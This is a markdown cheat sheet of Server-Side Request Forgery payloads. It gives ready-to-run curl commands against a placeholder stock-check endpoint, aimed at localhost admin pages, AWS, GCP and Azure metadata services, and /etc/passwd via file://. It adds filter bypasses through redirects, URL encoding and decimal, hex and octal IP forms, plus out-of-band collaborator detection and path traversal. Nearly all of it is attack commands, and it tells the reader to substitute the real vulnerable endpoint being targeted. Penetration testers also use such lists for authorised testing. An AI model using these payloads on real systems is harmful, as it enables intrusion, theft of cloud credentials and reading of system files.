# SSRF Payloads with Curl Examples

This document categorizes various Server-Side Request Forgery (SSRF) payloads based on the type of attack and provides corresponding curl commands for easy understanding and usage.

---

## 1. **Basic SSRF to Internal Services**
### Description:
Attempt to access internal HTTP services like localhost or 127.0.0.1

```
# Curl command:
curl -X POST https://example.com/api/check-stock -d "stockApi=http://127.0.0.1/admin"
curl -X POST https://example.com/api/check-stock -d "stockApi=http://localhost/admin"
```

---

## 2. **SSRF via DNS Resolution**
### Description:
Use domain names that resolve to localhost internally.

```
# Curl command:
curl -X POST https://example.com/api/check-stock -d "stockApi=http://internal.example.com/admin"
```

---

## 3. **SSRF to Access Cloud Metadata Services**
### Description:
Target cloud metadata endpoints (AWS, GCP, Azure).

```
# AWS Metadata
curl -X POST https://example.com/api/check-stock -d "stockApi=http://169.254.169.254/latest/meta-data/"

# GCP Metadata
curl -X POST https://example.com/api/check-stock -d "stockApi=http://metadata.google.internal/computeMetadata/v1/"

# Azure Metadata
curl -X POST https://example.com/api/check-stock -d "stockApi=http://169.254.169.254/metadata/instance?api-version=2021-02-01"
```

---

## 4. **SSRF to File Protocol (LFI-like)**
### Description:
Attempt to read files via file:// protocol.

```
# Curl command:
curl -X POST https://example.com/api/check-stock -d "stockApi=file:///etc/passwd"
```

---

## 5. **SSRF with Redirect Bypass**
### Description:
Use a redirecting domain to bypass filters.

```
# Curl command:
curl -X POST https://example.com/api/check-stock -d "stockApi=http://redirector.com/redirect?target=http://127.0.0.1/admin"
```

---

## 6. **SSRF with URL Encoding (Bypass Filters)**
### Description:
Bypass filters using encoding tricks.

```
# Encoded localhost
curl -X POST https://example.com/api/check-stock -d "stockApi=http://%31%32%37%2e%30%2e%30%2e%31/admin"
```

---

## 7. **SSRF via Uncommon IP Encodings**
### Description:
Use hexadecimal, octal, or decimal formats to bypass filtering.

```
# Decimal representation
curl -X POST https://example.com/api/check-stock -d "stockApi=http://2130706433/admin"

# Hexadecimal
curl -X POST https://example.com/api/check-stock -d "stockApi=http://0x7f000001/admin"

# Octal
curl -X POST https://example.com/api/check-stock -d "stockApi=http://017700000001/admin"
```

---

## 8. **Blind SSRF (Out-of-Band)**
### Description:
Use Burp Collaborator or webhook.site to detect SSRF.

```
# Curl command:
curl -X POST https://example.com/api/check-stock -d "stockApi=http://your-collaborator-url.burpcollaborator.net"
```

---

## 9. **SSRF using Path Traversal**
### Description:
Use path traversal to escape from filters and reach internal services.

```
# Curl command:
curl -X POST https://example.com/api/check-stock -d "stockApi=http://example.com/../../admin"
```

---

## 10. **SSRF to Reach External Domains (Sometimes Restricted)**
### Description:
Try SSRF to valid external domains if allowed.

```
# Curl command:
curl -X POST https://example.com/api/check-stock -d "stockApi=http://google.com"
```

---

> Replace `https://example.com/api/check-stock` with the actual vulnerable endpoint you're targeting.

